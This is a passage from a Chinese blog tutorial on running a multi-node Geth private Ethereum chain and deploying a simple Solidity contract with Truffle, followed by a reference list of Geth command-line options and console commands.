variable">--datadir</span> ./node2data <span class="token parameter variable">--networkid</span> <span class="token number">987</span> <span class="token parameter variable">--port</span> <span class="token number">30304</span> <span class="token parameter variable">--nodiscover</span> <span class="token parameter variable">--http</span> <span class="token parameter variable">--http.addr</span> <span class="token string">"127.0.0.1"</span> <span class="token parameter variable">--http.port</span> <span class="token number">8546</span> <span class="token parameter variable">--http.corsdomain</span> <span class="token string">"*"</span> <span class="token parameter variable">--http.api</span> <span class="token string">"eth,net,web3,personal,admin"</span> console<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="8-多节点连接的总结步骤"><a href="#8-多节点连接的总结步骤" class="headerlink" title="8. 多节点连接的总结步骤"></a>8. <strong>多节点连接的总结步骤</strong></h4><ol><li>创建 <code>genesis.json</code> 文件，并初始化所有节点。</li><li>启动每个节点，确保使用相同的 <code>networkid</code> 和不同的 <code>port</code>。</li><li>使用 <code>admin.addPeer</code> 手动连接节点，确保它们可以互相通信。</li><li>启动挖矿，并通过 <code>miner.start()</code> 命令进行区块生成。</li><li>使用 <code>admin.peers</code> 和 <code>net.peerCount</code> 查看连接状态。</li></ol><p>通过这些步骤，你可以在私链上搭建多个节点的网络，节点之间可以互相同步区块、挖矿和发送交易。</p><h2 id="三、构建示例项目"><a href="#三、构建示例项目" class="headerlink" title="三、构建示例项目"></a>三、构建示例项目</h2><h3 id="创建-Truffle-项目"><a href="#创建-Truffle-项目" class="headerlink" title="创建 Truffle 项目"></a>创建 Truffle 项目</h3><ol><li><h4 id="创建项目目录："><a href="#创建项目目录：" class="headerlink" title="创建项目目录："></a><strong>创建项目目录</strong>：</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> my-dapp<span class="token builtin class-name">cd</span> my-dapp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><h4 id="初始化-Truffle-项目："><a href="#初始化-Truffle-项目：" class="headerlink" title="初始化 Truffle 项目："></a><strong>初始化 Truffle 项目</strong>：</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">truffle init or truffle.cmd unbox webpack <span class="token comment">#后者用 webpack 模版初始化项目骨架结构</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>安装项目依赖的 NPM 包 ，执行以下命令安装 npm 包:  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> app<span class="token function">npm</span> <span class="token function">install</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ol><h3 id="修改-Truffle-配置"><a href="#修改-Truffle-配置" class="headerlink" title="修改 Truffle 配置"></a>修改 Truffle 配置</h3><p>在项目根目录下找到 <code>truffle-config.js</code> 文件，并修改如下：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span>  <span class="token literal-property property">networks</span><span class="token operator">:</span> <span class="token punctuation">{</span>    <span class="token literal-property property">development</span><span class="token operator">:</span> <span class="token punctuation">{</span>      <span class="token literal-property property">host</span><span class="token operator">:</span> <span class="token string">"localhost"</span><span class="token punctuation">,</span>  <span class="token comment">// 根据实际情况设置</span>      <span class="token literal-property property">port</span><span class="token operator">:</span> <span class="token number">8545</span><span class="token punctuation">,</span>         <span class="token comment">// 根据实际情况设置</span>      <span class="token literal-property property">network_id</span><span class="token operator">:</span> <span class="token string">"*"</span><span class="token punctuation">,</span>    <span class="token comment">// 匹配任何网络 ID</span>      <span class="token literal-property property">gas</span><span class="token operator">:</span> <span class="token number">3000000</span>        <span class="token comment">// 设置最大 gas 限制</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token literal-property property">compilers</span><span class="token operator">:</span> <span class="token punctuation">{</span>    <span class="token literal-property property">solc</span><span class="token operator">:</span> <span class="token punctuation">{</span>      <span class="token literal-property property">version</span><span class="token operator">:</span> <span class="token string">"0.8.0"</span>   <span class="token comment">// 指定 Solidity 编译器版本</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="编写智能合约"><a href="#编写智能合约" class="headerlink" title="编写智能合约"></a>编写智能合约</h3><p>在 <code>contracts</code> 目录下创建一个新的合约文件，例如 <code>MyContract.sol</code>：</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">MyContract</span> <span class="token punctuation">{</span>    <span class="token builtin">string</span> <span class="token keyword">public</span> message<span class="token punctuation">;</span>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">string</span> <span class="token keyword">memory</span> initialMessage<span class="token punctuation">)</span> <span class="token punctuation">{</span>        message <span class="token operator">=</span> initialMessage<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">setMessage</span><span class="token punctuation">(</span><span class="token builtin">string</span> <span class="token keyword">memory</span> newMessage<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>        message <span class="token operator">=</span> newMessage<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="创建迁移文件"><a href="#创建迁移文件" class="headerlink" title="创建迁移文件"></a>创建迁移文件</h3><p>在 <code>migrations</code> 目录下创建一个新的迁移文件，例如 <code>2_deploy_my_contract.js</code>：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> MyContract <span class="token operator">=</span> artifacts<span class="token punctuation">.</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"MyContract"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span><span class="token function-variable function">exports</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">deployer</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  deployer<span class="token punctuation">.</span><span class="token function">deploy</span><span class="token punctuation">(</span>MyContract<span class="token punctuation">,</span> <span class="token string">"Hello, World!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="1-默认迁移行为"><a href="#1-默认迁移行为" class="headerlink" title="1. 默认迁移行为"></a>1. 默认迁移行为</h4><p>当你运行以下命令时：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">truffle migrate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Truffle 会按照 <code>migrations</code> 目录中脚本的顺序自动部署所有合约。每个脚本的文件名通常以数字开头，以确定部署顺序。例如：</p><ul><li><code>1_initial_migration.js</code></li><li><code>2_deploy_contracts.js</code></li></ul><h4 id="2-部署特定合约"><a href="#2-部署特定合约" class="headerlink" title="2. 部署特定合约"></a>2. 部署特定合约</h4><p>如果你只想部署特定的合约，可以按照以下步骤进行：</p><h5 id="2-1-创建特定迁移文件"><a href="#2-1-创建特定迁移文件" class="headerlink" title="2.1 创建特定迁移文件"></a>2.1 创建特定迁移文件</h5><p>你可以在 <code>migrations</code> 目录中创建新的迁移文件，只包含要部署的合约。例如，假设你只想部署 <code>MyContract</code> 合约，你可以创建一个新的迁移文件，例如 <code>3_deploy_my_contract.js</code>，内容如下：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> MyContract <span class="token operator">=</span> artifacts<span class="token punctuation">.</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"MyContract"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span><span class="token function-variable function">exports</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">deployer</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  deployer<span class="token punctuation">.</span><span class="token function">deploy</span><span class="token punctuation">(</span>MyContract<span class="token punctuation">,</span> <span class="token string">"Hello, World!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="2-2-使用-f-参数"><a href="#2-2-使用-f-参数" class="headerlink" title="2.2 使用 --f 参数"></a>2.2 使用 <code>--f</code> 参数</h5><p>如果你想只运行特定的迁移文件，可以使用 <code>--f</code> 参数（<code>--f</code> 后接文件的序号）：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">truffle migrate <span class="token parameter variable">--f</span> <span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这将只运行 <code>3_deploy_my_contract.js</code> 文件中的迁移脚本。</p><h4 id="3-回滚并重新部署"><a href="#3-回滚并重新部署" class="headerlink" title="3. 回滚并重新部署"></a>3. 回滚并重新部署</h4><p>如果你需要重新部署某个合约，可以使用 <code>--reset</code> 参数，这将重新运行所有的迁移：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">truffle migrate <span class="token parameter variable">--reset</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果只想回滚到某个特定迁移并重新部署，你可以使用 <code>--to</code> 参数：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">truffle migrate <span class="token parameter variable">--to</span> <span class="token number">2</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这将回滚到并重新部署到第二个迁移（<code>2_deploy_contracts.js</code>）为止的所有迁移。</p><h4 id="4-部署的选择性控制"><a href="#4-部署的选择性控制" class="headerlink" title="4. 部署的选择性控制"></a>4. 部署的选择性控制</h4><p>如果你的合约之间存在依赖关系（例如，一个合约依赖于另一个合约），你应该确保按照适当的顺序部署。可以在迁移脚本中引用之前已经部署的合约：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> MyContractA <span class="token operator">=</span> artifacts<span class="token punctuation">.</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"MyContractA"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> MyContractB <span class="token operator">=</span> artifacts<span class="token punctuation">.</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"MyContractB"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span><span class="token function-variable function">exports</span> <span class="token operator">=</span> <span class="token keyword">async</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">deployer</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">await</span> deployer<span class="token punctuation">.</span><span class="token function">deploy</span><span class="token punctuation">(</span>MyContractA<span class="token punctuation">,</span> <span class="token string">"Hello"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">const</span> instanceA <span class="token operator">=</span> <span class="token keyword">await</span> MyContractA<span class="token punctuation">.</span><span class="token function">deployed</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 部署时传递 MyContractA 的地址</span>  <span class="token keyword">await</span> deployer<span class="token punctuation">.</span><span class="token function">deploy</span><span class="token punctuation">(</span>MyContractB<span class="token punctuation">,</span> instanceA<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="编译合约"><a href="#编译合约" class="headerlink" title="编译合约"></a>编译合约</h3><p>在部署合约之前，您需要确保智能合约已被编译。您可以通过以下命令来编译合约：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">truffle compile<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="自动编译与部署"><a href="#自动编译与部署" class="headerlink" title="自动编译与部署"></a>自动编译与部署</h4><p>在执行 <code>truffle migrate</code> 时，Truffle 会自动检查合约是否已经编译。如果合约文件有更改或未编译，Truffle 会自动执行编译。因此，在以下情况下，您可以不手动执行编译命令：</p><ul><li><strong>合约未编译</strong>：当您修改了合约后，执行 <code>truffle migrate</code> 时会自动编译。</li><li><strong>合约已经是最新</strong>：如果合约未更改并且已经编译，则可以直接执行迁移命令。</li></ul><h4 id="如何确认编译状态"><a href="#如何确认编译状态" class="headerlink" title="如何确认编译状态"></a>如何确认编译状态</h4><p>如果您不确定合约是否已经编译，可以检查 <code>build/contracts</code> 目录。编译后，该目录下应该会生成合约的 JSON 文件（包含字节码和 ABI）。例如，<code>MyContract.json</code> 文件中应该有相关信息。</p><p>如果您希望在每次部署时都重新编译合约，可以在 <code>migrate</code> 命令中使用 <code>--compile-all</code> 参数，如下所示：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">truffle migrate --compile-all<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这将强制 Truffle 重新编译所有合约。</p><h3 id="启动-Geth-节点"><a href="#启动-Geth-节点" class="headerlink" title="启动 Geth 节点"></a>启动 Geth 节点</h3><p>在 Geth 的命令行窗口中，启动您的节点，使用以下命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">geth <span class="token parameter variable">--datadir</span> ./data <span class="token parameter variable">--networkid</span> <span class="token number">987</span> <span class="token parameter variable">--nodiscover</span> <span class="token parameter variable">--port</span> <span class="token number">30303</span> <span class="token parameter variable">--rpc</span> <span class="token parameter variable">--rpcaddr</span> <span class="token string">"127.0.0.1"</span> <span class="token parameter variable">--rpcport</span> <span class="token string">"8545"</span> <span class="token parameter variable">--rpccorsdomain</span> <span class="token string">"*"</span> <span class="token parameter variable">--rpcapi</span> <span class="token string">"eth,net,web3,personal,admin,shh,txpool,debug,miner"</span> <span class="token parameter variable">--mine</span> <span class="token parameter variable">--minerthreads</span> <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="解锁账户-2"><a href="#解锁账户-2" class="headerlink" title="解锁账户"></a>解锁账户</h3><p>在 Geth 控制台中，解锁您的账户（假设 <code>user1</code> 是您的账户地址）：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">personal<span class="token punctuation">.</span><span class="token function">unlockAccount</span><span class="token punctuation">(</span><span class="token string">"user1"</span><span class="token punctuation">,</span> <span class="token string">"your_password"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果已经正确地解锁了账户,你会看到部署过程停止在某个状态</p><p>这是因为 truffle 在等待部署交易提交,但是我们在私链中还没有启动挖矿。  现在切换回 geth 终端窗口,查看交易池的状态:  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">txpool.status  <span class="token punctuation">{</span>  pending:1,  queued:0  <span class="token punctuation">}</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>有一个挂起的交易</p><h3 id="启动挖矿-1"><a href="#启动挖矿-1" class="headerlink" title="启动挖矿"></a>启动挖矿</h3><p>在 Geth 控制台中，启动挖矿：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">miner<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>稍等小会儿,再查看交易池的状态:  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">txpool.status  <span class="token punctuation">{</span>  pending:0,  queued:0  <span class="token punctuation">}</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>交易已经成功提交了</p><h3 id="部署合约"><a href="#部署合约" class="headerlink" title="部署合约"></a>部署合约</h3><p>在项目目录中，使用以下命令部署合约：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">truffle migrate <span class="token parameter variable">--network</span> development<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="检查部署结果"><a href="#检查部署结果" class="headerlink" title="检查部署结果"></a>检查部署结果</h3><p>部署完成后，您可以查看终端输出中的合约地址和交易哈希，确认合约是否成功部署。</p><h3 id="与合约交互"><a href="#与合约交互" class="headerlink" title="与合约交互"></a>与合约交互</h3><p>在合约部署后，您可以使用 Truffle 控制台与合约进行交互：</p><ol><li><p>启动 Truffle 控制台：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">truffle console <span class="token parameter variable">--network</span> development<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>在控制台中，获取合约实例并与其交互：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> instance <span class="token operator">=</span> <span class="token keyword">await</span> MyContract<span class="token punctuation">.</span><span class="token function">deployed</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> currentMessage <span class="token operator">=</span> <span class="token keyword">await</span> instance<span class="token punctuation">.</span><span class="token function">message</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>currentMessage<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 输出当前消息</span><span class="token keyword">await</span> instance<span class="token punctuation">.</span><span class="token function">setMessage</span><span class="token punctuation">(</span><span class="token string">"New Message"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 更新消息</span><span class="token keyword">const</span> updatedMessage <span class="token operator">=</span> <span class="token keyword">await</span> instance<span class="token punctuation">.</span><span class="token function">message</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>updatedMessage<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 输出更新后的消息</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="启动-DApp"><a href="#启动-DApp" class="headerlink" title="启动 DApp"></a>启动 DApp</h3><p>执行以下命令来启动 DApp:  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> run dev  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在浏览器里访问 <a href="http://localhost:8080/">http://localhost:8080</a> 即可</p><p>如果你希望从别的机器也可以访问你的 DApp 应用,修改一下 <code>package.json</code>:  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">{</span>  scripts:<span class="token punctuation">{</span>    <span class="token string">"dev"</span><span class="token builtin class-name">:</span> <span class="token string">"webpack-dev-server –-host 0.0.0.0"</span>     <span class="token punctuation">}</span>      <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="四、命令详解"><a href="#四、命令详解" class="headerlink" title="四、命令详解"></a>四、命令详解</h2><h3 id="1-Geth-命令行选项"><a href="#1-Geth-命令行选项" class="headerlink" title="1. Geth 命令行选项"></a>1. <strong>Geth 命令行选项</strong></h3><p>这些命令是在启动 Geth 时使用的，用来配置节点行为。</p><ul><li><p><strong>–datadir</strong>：指定数据目录，所有区块链和配置数据将保存在此目录中。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">geth <span class="token parameter variable">--datadir</span> ./data<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>–networkid</strong>：选择要加入的网络 ID，避免连接到错误的链。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">geth <span class="token parameter variable">--networkid</span> <span class="token number">987</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>–port</strong>：指定节点的P2P通信端口（默认是 30303）。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">geth <span class="token parameter variable">--port</span> <span class="token number">30303</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>–nodiscover</strong>：禁用节点自动发现，防止自动连接其他节点（常用于私有网络）。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">geth <span class="token parameter variable">--nodiscover</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>–maxpeers</strong>：设置最多连接的节点数（默认 25）。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">geth <span class="token parameter variable">--maxpeers</span> <span class="token number">30</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>–mine</strong>：启动节点时立即开始挖矿。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">geth <span class="token parameter variable">--mine</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>–minerthreads</strong>：设置挖矿使用的线程数量（默认为 1）。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">geth <span class="token parameter variable">--minerthreads</span> <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>–etherbase</strong>：指定挖矿奖励接收的以太坊地址。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">geth <span class="token parameter variable">--etherbase</span> 0x7df9a875a174b3bc565e6424a0050ebc1b2d1d82<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>–rpc</strong>：启用 HTTP-RPC 接口，允许通过 HTTP 与节点交互。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">geth <span class="token parameter variable">--rpc</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>–rpcaddr</strong>：指定 HTTP-RPC 接口监听的地址。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">geth <span class="token parameter variable">--rpcaddr</span> <span class="token number">127.0</span>.0.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>–rpcport</strong>：指定 HTTP-RPC 端口。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">geth <span class="token parameter variable">--rpcport</span> <span class="token number">8545</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>–rpccorsdomain</strong>：指定允许通过 CORS（跨域资源共享）访问的域，通常设置为 <code>*</code> 允许所有域。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">geth <span class="token parameter variable">--rpccorsdomain</span> <span class="token string">"*"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>–rpcapi</strong>：指定允许通过 RPC 接口调用的 API 模块（例如 <code>eth</code>, <code>net</code>, <code>web3</code>）。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">geth <span class="token parameter variable">--rpcapi</span> <span class="token string">"eth,net,web3"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>–syncmode</strong>：设置节点的同步模式，常用的有：</p><ul><li><code>fast</code>（默认，快速同步）</li><li><code>full</code>（完全同步）</li><li><code>light</code>（轻节点，只下载区块头）</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">geth <span class="token parameter variable">--syncmode</span> fast<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>–ipcdisable</strong>：禁用 Geth 的 IPC-RPC 通信接口（默认启用 IPC）。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">geth <span class="token parameter variable">--ipcdisable</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h3 id="2-Geth-控制台命令"><a href="#2-Geth-控制台命令" class="headerlink" title="2. Geth 控制台命令"></a>2. <strong>Geth 控制台命令</strong></h3><p>这些命令是在 Geth 启动并进入控制台时使用的，或者通过 <code>geth attach</code> 来附加到已运行的节点。</p><ul><li><p><strong>eth.syncing</strong>：查看节点是否在同步，并返回同步状态。</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">eth<span class="token punctuation">.</span>syncing<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>eth.blockNumber</strong>：获取当前节点的区块高度。</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">eth<span class="token punctuation">.</span>blockNumber<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>**eth.getBlock(blockNumber)**：查看某个区块的信息（例如查看最新区块）。</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">eth<span class="token punctuation">.</span><span class="token function">getBlock</span><span class="token punctuation">(</span>eth<span class="token punctuation">.</span>blockNumber<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>**eth.getBalance(address)**：查看某个地址的余额。</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">eth<span class="token punctuation">.</span><span class="token function">getBalance</span><span class="token punctuation">(</span><span class="token string">"0xYourAddressHere"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>**miner.start(threads)**：启动挖矿，并指定使用的线程数（例如 1 个线程）。</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">miner<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>**miner.stop()**：停止挖矿。</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">miner<span class="token punctuation">.</span><span class="token function">stop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>**personal.newAccount(password)**：创建新账户，并设置密码。</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">personal<span class="token punctuation">.</span><span class="token function">newAccount</span><span class="token punctuation">(</span><span class="token string">"YourPassword"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>**personal.unlockAccount(address, password)**：解锁指定账户，允许在一段时间内使用账户进行交易。</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">personal<span class="token punctuation">.</span><span class="token function">unlockAccount</span><span class="token punctuation">(</span><span class="token string">"0xYourAddressHere"</span><span class="token punctuation">,</span> <span class="token string">"YourPassword"</span><span class="token punctuation">,</span> <span class="token number">600</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>admin.peers</strong>：查看当前连接的节点。</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">admin<span class="token punctuation">.</span>peers<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>**admin.addPeer(enodeURL)**：手动添加一个节点。</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">admin<span class="token punctuation">.</span><span class="token function">addPeer</span><span class="token punctuation">(</span><span class="token string">"enode://..."</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>net.peerCount</strong>：查看连接的节点数量。</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">net<span class="token punctuation">.</span>peerCount<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>txpool.status</strong>：查看交易池的状态，包含等待和挂起的交易数量。</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">txpool<span class="token punctuation">.</span>status<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>**debug.verbosity(level)**：设置日志的详细程度（0 为最少，5 为最多）。</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">debug<span class="token punctuation">.</span><span class="token function">verbosity</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>**web3.sha3(string)**：计算字符串的 Keccak-256 哈希。</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">web3<span class="token punctuation">.</span><span class="token function">sha3</span><span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>**eth.sendTransaction({from: sender, to: receiver, value: amount})**：发送交易（注意单位为 Wei）。</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">eth<span class="token punctuation">.</span><span class="token function">sendTransaction</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token literal-property property">from</span><span class="token operator">:</span> <span class="token string">"0xYourAddress"</span><span class="token punctuation">,</span> <span class="token literal-property property">to</span><span class="token operator">:</span> <span class="token string">"0xReceiverAddress"</span><span class="token punctuation">,</span> <span class="token literal-property property">value</span><span class="token operator">:</span> web3<span class="token punctuation">.</span><span class="token function">toWei</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"ether"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span aria-hidden="true" 